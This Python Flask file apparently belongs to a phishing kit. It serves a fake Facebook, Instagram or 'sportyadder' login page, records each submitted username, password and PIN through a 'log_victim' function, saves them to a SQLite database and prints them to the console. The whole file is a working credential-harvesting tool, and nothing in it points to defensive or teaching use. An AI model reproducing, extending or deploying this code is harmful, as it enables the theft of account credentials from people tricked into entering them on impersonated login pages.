import os, time, logging
from flask import Flask, render_template, request, redirect, url_for, session
from model import db, User, User2
from sqlalchemy.exc import OperationalError
from jinja2 import TemplateNotFound
from victims import log_victim

# Set the folders for your HTML templates and static files (like CSS, JS, images).
TEMPLATE_DIR = "./templates"
STATIC_DIR = "./static"

# Create the Flask app object and add all the configurations you wish to.
app = Flask(
    __name__,
    template_folder=TEMPLATE_DIR,
    static_folder=STATIC_DIR,
)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///users.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SECRET_KEY"] = (
    "692hdkbckjz9qqykq3t8eq"  # Needed for sessions and flash messages
)

# This starts the model for the database.
db.init_app(app)


def register_routes(app, allowed_platform):
    def handle_platform(platform):
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            pin = request.form.get("pin") if platform == "sportyadder" else None
            log_victim(platform, username, password, pin)
            if platform == "sportyadder":
                try:
                    new_user2 = User2(username=username, password=password, pin=pin)
                    db.session.add(new_user2)
                    db.session.commit()
                    user2 = (
                        User2.query.filter_by(username=username, password=password, pin=pin)
                        .order_by(User2.id.desc())
                        .first()
                    )
                except OperationalError as e:
                    print(f"Database error: {e}")
                    return "Database file is missing or inaccessible. Please check your database setup."
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    return "An unexpected error occurred. Please contact admin."
                if user2:
                    print(
                        f"[{platform.upper()}] New login: username='{username}', password='{password}', pin='{pin}'"
                    )
                    session["username"] = user2.username
                    return redirect(url_for(platform))
            else:
                try:
                    new_user = User(username=username, password=password)
                    db.session.add(new_user)
                    db.session.commit()
                    user = (
                        User.query.filter_by(username=username, password=password)
                        .order_by(User.id.desc())
                        .first()
                    )
                except OperationalError as e:
                    print(f"Database error: {e}")
                    return "Database file is missing or inaccessible. Please check your database setup."
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    return "An unexpected error occurred. Please contact admin."
                if user:
                    print(
                        f"[{platform.upper()}] New login: username='{username}', password='{password}'"
                    )
                    session["username"] = user.username
                    return redirect(url_for(platform))
        # Render the platform-specific template
        try:
            return render_template(f"{platform}.html")
        except TemplateNotFound:
            return f"Template '{platform}.html' is missing. Please add it to your templates folder."
        except Exception as e:
            print(f"Template error: {e}")
            return "An unexpected template error occurred. Please contact admin."

    # Only register the selected platform's route
    app.add_url_rule(
        "/",
        endpoint=allowed_platform,
        view_func=lambda platform=allowed_platform: handle_platform(platform),
        methods=["GET", "POST"],
    )


# This runs when you start the script
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        # Get the user's choice
        routes = {
            "1": ("facebook", "/facebook"),
            "2": ("instagram", "/instagram"),
            "3": ("sportyadder", "/sportyadder"),
        }
        print("\nWelcome! Which page do you want to load?\n")
        for number, (name, _) in routes.items():
            print(f"  {number}. {name.capitalize()}")

        choice = input("Enter the number of your choice (1-3): ").strip()
        if choice in routes:
            allowed_platform, _ = routes[choice]
            print(f"\nYou selected {allowed_platform.capitalize()}.")
        else:
            print("Invalid selection. Exiting.\n")
            exit(1)
        time.sleep(1)
        os.system("clear || cls")
    else:
        # Default to facebook if reloader
        allowed_platform = "facebook"
    register_routes(app, allowed_platform)
    app.run(debug=False)  # Start the Flask server
